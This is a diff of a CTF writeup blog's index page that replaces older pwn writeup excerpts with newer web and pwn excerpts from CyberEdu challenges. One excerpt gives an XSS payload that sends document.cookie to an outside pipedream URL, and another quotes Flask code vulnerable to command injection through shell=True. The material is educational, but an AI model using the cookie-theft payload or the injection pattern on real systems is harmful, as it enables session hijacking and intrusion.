@@ -147,162 +147,163 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu offensive-honeypot Writeup
+    <h2 class="entry-hint-parent">CyberEdu manual-review Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Just another pwn challenge.
-We’re dealing with a little game, and a canary.
-The win condition is that we beat the game, by killing the hacker player.
-Identifying the vulnerabilities The vulnerability here is that we can calculate the random number ourselves, very similarly to another challenge I wrote the writeup for here.
-Since we know the seed ourselves, we can get the same value for rand() that the game gets.
+    <p>Challenge overview For any coffe machine issue please open a ticket at the IT support department.
+Flag format: ctf{sha256}
+Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
+Identifying the vulnerabilities This look familiar?
+Alright, so XSS is confirmed, and we have two types of cookies.
+First, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.
+I sent a &lt;script&gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; &#43; encodeURIComponent(document.cookie)); &lt;/script&gt; and look at what we got -
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-28 00:00:00 +0000 UTC'>December 28, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu offensive-honeypot Writeup" href="https://irinasusca.github.io/writeup-blog/posts/offensivehoneypot-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu manual-review Writeup" href="https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu darkmagic Writeup
+    <h2 class="entry-hint-parent">CyberEdu broken-login Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview In a distant land a dark magical power lay. We need a hero to defeat these dark forces.
-We’re working with a 64-bit binary with NX and Canary enabled, and a format string vulnerability. Let’s take a look at the binary.
-This is the vuln function, along which we have a getshell function that we need to redirect to. We can deduct that v5 is our canary being checked.
+    <p>Challenge overview Intern season is up again and our new intern Alex had to do a simple login page. Not only the login page is not working properly, it is also highly insecure…
+Identifying the vulnerabilities This is how our POST requests are sent.
+Then, another GET is made: GET /auth?username=67616761&amp;password=9748ae63d43e39bb35e3060fbde9f34c731d4173f8b579441404bed6f485644335fca004f512c6602f77549e0aa5e23fec9a8b3979d61a73b9eb414ee9a27ca6.
+That’s a sha512 hash. I’m thinking, why don’t we try rockyou.txt? We can just sha512 each entry, send it, and see if we get a response with a content length higher than 0. That failed though.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-27 00:00:00 +0000 UTC'>December 27, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu darkmagic Writeup" href="https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu broken-login Writeup" href="https://irinasusca.github.io/writeup-blog/posts/brokenlogin-writeup/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu get-access Writeup
+    <h2 class="entry-hint-parent">CyberEdu file-crawler Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Can you pwn this?
-Very interestingly, this challenge doesn’t come with any source files, and we just get a Username and Password prompt.
-Identifying the vulnerabilities The first thing I thought about was a buffer overflow.
-The Username seemed to read a specific amount of bytes, and the overflow would go into password, and password just didn’t crash anything, so it might’ve been the same situation.
+    <p>I was stuck between starting to study heap properly or keep doing web challenges, and I guess here we are.
+Challenge overview Find the vulnerability and get the flag. The flag is located in a temporary folder.
+Identifying the vulnerabilities I inspected the original GET request with burp:
+Since the flag is located in a “temporary folder”, my first guess was /tmp/flag. I tried /local, and we get a TRY HARDER message.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-27 00:00:00 +0000 UTC'>December 27, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu get-access Writeup" href="https://irinasusca.github.io/writeup-blog/posts/getaccess-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu file-crawler Writeup" href="https://irinasusca.github.io/writeup-blog/posts/filecrawler-writeup/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu nulle Writeup
+    <h2 class="entry-hint-parent">CyberEdu ping-station Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Our developer got a bit too clever with C structs. They decided that if two structs have the same fields, just in a different order, it’s fine to cast between them.
-Let’s look at our binary, main.
-In our main function, we get to write into a aIsYour string, after which a function I named call_param that looks like this is called:
-This function essentially calls the function at address a1 (its parameter), passing the value located at a1&#43;1 (immediately after a1) as a parameter to the a1() function.
+    <p>Challenge overview Just another ping service to audit.
+We get an app(1).py file to look at.
+from flask import Flask, render_template, url_for, request, redirect import subprocess import re import string app = Flask(__name__) def is_valid_ip(ip): ipv = re.match(r&#34;^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$&#34;,ip) return bool(ipv) @app.route(&#39;/&#39;, methods=[&#39;POST&#39;, &#39;GET&#39;]) def index(): if request.method == &#39;POST&#39;: ip = request.form[&#39;content&#39;] if (is_valid_ip(ip)==True): for i in range(0,2): return &#39;&lt;pre&gt;&#39;&#43;subprocess.check_output(&#34;ping -c 4 &#34;&#43;ip,shell=True).decode()&#43;&#39;&lt;/pre&gt;&#39; break else: return&#34;That&#39;s not a valid IP&#34; else: return render_template(&#39;index.html&#39;) if __name__ == &#34;__main__&#34;: app.run(host = &#34;0.0.0.0&#34;) Identifying the vulnerabilities Looking at that &#34;ping -c 4 &#34;&#43;ip,shell=True), if we manage to smuggle a command past this is_valid_ip function, it will get executed.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-27 00:00:00 +0000 UTC'>December 27, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu nulle Writeup" href="https://irinasusca.github.io/writeup-blog/posts/nulle-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu ping-station Writeup" href="https://irinasusca.github.io/writeup-blog/posts/pingstation-writeup/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu baby-fmt Writeup
+    <h2 class="entry-hint-parent">CyberEdu jargon Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Merry Christmas everyone! 🎄
-Challenge overview This is should be a basic pwn challenge but please be aware that time is not your friend.
-Let’s check out the restrictions we’re dealing with.
-We’re working with a 64-bit binary with NX and PIE enabled, and as the name suggests, probably a format string vulnerability. Let’s take a look at the disassembled binary.
-We have a function called by main, let’s call it vuln.
+    <p>Challenge overview This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?
+Identifying the vulnerabilities We can look at /tickets?user=admin by clicking tickets. Here we’re given some hints:
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-26 00:00:00 +0000 UTC'>December 26, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu baby-fmt Writeup" href="https://irinasusca.github.io/writeup-blog/posts/babyfmt-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-09 00:00:00 +0000 UTC'>January 9, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu jargon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu aptssh Writeup
+    <h2 class="entry-hint-parent">Serialization and Deserialization
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag.
-First of all, what is a PAM module? Well, PAM stands for Pluggable Authentification Modules, and it’s how Linux decides how we can log in, how passwords are checked, and so on.
-So, nc isn’t going to be how we solve this. Instead, we’re going to login using ssh like so:
+    <p>Why I decided to get more into this subject because of the challenge jargon. I was struggling with AIs and it was really getting on my nerves, because I felt I didn’t really understand what was going on. So I decided to write a little article about this, to make myself fully grasp serialization, deserialization and the subset of vulnerabilities that may come with them. So, let’s get into it.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-23 00:00:00 +0000 UTC'>December 23, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu aptssh Writeup" href="https://irinasusca.github.io/writeup-blog/posts/aptssh-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-08 00:00:00 +0000 UTC'>January 8, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to Serialization and Deserialization" href="https://irinasusca.github.io/writeup-blog/posts/serialization/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu Ropper Writeup
+    <h2 class="entry-hint-parent">CyberEdu reccon Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Your message is at maximum two stages from the flag. Find the bugs in this binary file and you will know what to do.
-As the name ropper suggests, and the buffer overflow shown in the image above, we’re dealing with a ret2something here.
-Let’s take a look at the binary. We have a main and another secondary function being used here.
-main calls the second functions and passes, as arguments, the string getting printed and 0.
+    <p>Challenge overview I heard you like memes, so we had a surprise for you. Enjoy !!
+Today is a big day. Finally solving a non-pwn challenge! Let’s see if I can still remember how burpsuite works.
+Identifying the vulnerabilities First I ran ffuf -u http://34.159.240.221:31548/FUZZ -w /usr/share/wordlists/dirb/common.txt, but only found .hta, .htaccess, .htpasswd and index.php.
+This is all. I ffufed for /images_FUZZ too, but nothing.
+I did exiftool, strings, looked at it in hex, steghide, stegseek, just about everything.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-22 00:00:00 +0000 UTC'>December 22, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu Ropper Writeup" href="https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-07 00:00:00 +0000 UTC'>January 7, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu reccon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/reccon-writeup/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu function-check Writeup
+    <h2 class="entry-hint-parent">CyberEdu cookies Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview We need a master to manipulate the syntax of a program.
-At first glance, the format looks like a 32-bit executable, and it doesn’t really look like it’s going to be fun to test locally, so let’s just try it remotely right away.
-Upon checking, every protection is disabled, so that’s nice! Now let’s take a look at the binary.
-Pretty straight forward, we have a main function and a printFlag function. As the binary name suggests, a fmtstr vulnerability, and a value demo_3187 we’re supposed to overwrite.
+    <p>Challenge overview Cookies for my friends.
+We’ve got a 64-bit binary, 100% format string vulnerability, canary and NX enabled.
+This loop happens exactly twice, to leak something then for us to exploit the buffer overflow.
+We even have a getshell function, so this really won’t be that complicated; We’re not even dealing with PIE.
+Identifying the vulnerabilities We get the gadgets in our binary, we can start looking for the canary now! Let’s just look remotely straight away, so we don’t bother with trying to do it twice, since the offsets are going to differ.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-21 00:00:00 +0000 UTC'>December 21, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu function-check Writeup" href="https://irinasusca.github.io/writeup-blog/posts/functioncheck-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-04 00:00:00 +0000 UTC'>January 4, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu cookies Writeup" href="https://irinasusca.github.io/writeup-blog/posts/cookies-writeup/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu can-you-jump Writeup
+    <h2 class="entry-hint-parent">CyberEdu off Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview How far can you jump?
-Our binary, can-you-jump, is a 64-bit executable with no protections except NX. The challenge also gives us libc-2.27.so to use.
-Alright, pretty nice, we get a libc leak for printf, and immediately stumble upon a buffer overflow.
-Identifying the vulnerabilities Let’s take a look at the binary next.
-Pretty straight-forward, the address of printf is printed, using dlsym (a function that just returns the address of a symbol, this case printf). Then, the function returns a read in buf[56] of 256 bytes, so that’s a 200 byte buffer overflow. I’m guessing we can find a /bin/sh and system in our libc. Since I can’t be bothered to install the .so, we can just test remotely and find the offsets online.
+    <p>Challenge overview This application is here just to serve your team. When you are done, you can try to exploit it. We hope is going to be much more fun.
+We also have canary and NX enabled.
+Let’s look at the functions here. First we have a main which forks every time it’s ran:
+Then, this function is looped:
+It calls some weird functions on the string:
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-16 00:00:00 +0000 UTC'>December 16, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu can-you-jump Writeup" href="https://irinasusca.github.io/writeup-blog/posts/canyoujump-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-04 00:00:00 +0000 UTC'>January 4, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu off Writeup" href="https://irinasusca.github.io/writeup-blog/posts/off-writeup/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">VianuCTF 2025
+    <h2 class="entry-hint-parent">CyberEdu threadz Writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Introduction This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.
-Enough talking, here is what I solved:
-Christmas PIE - pwn As spoiled by the title, we’re dealing with a 64-bit PIE, and we get the address of main upon running the binary.
+    <p>Challenge overview Threads are so cool! And secure! So secure that I store all my secrets there
+Note 1: The flag is broken into chunks of 4 characters, like this: volatile __thread unsigned int flag1 = ‘{CFT’;
+The letters in the chunks are reversed for your convenience, and the chunks are defined in order
+Note 2: The binary is intentionally not given.
+Note 3: The program will read 0x1000 bytes of shellcode, stored into a mmap-ed region with RWX permissions
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-12-16 00:00:00 +0000 UTC'>December 16, 2025</span></footer>
-  <a class="entry-link" aria-label="post link to VianuCTF 2025" href="https://irinasusca.github.io/writeup-blog/posts/vianuctf-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-01-04 00:00:00 +0000 UTC'>January 4, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to CyberEdu threadz Writeup" href="https://irinasusca.github.io/writeup-blog/posts/threadz-writeup/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
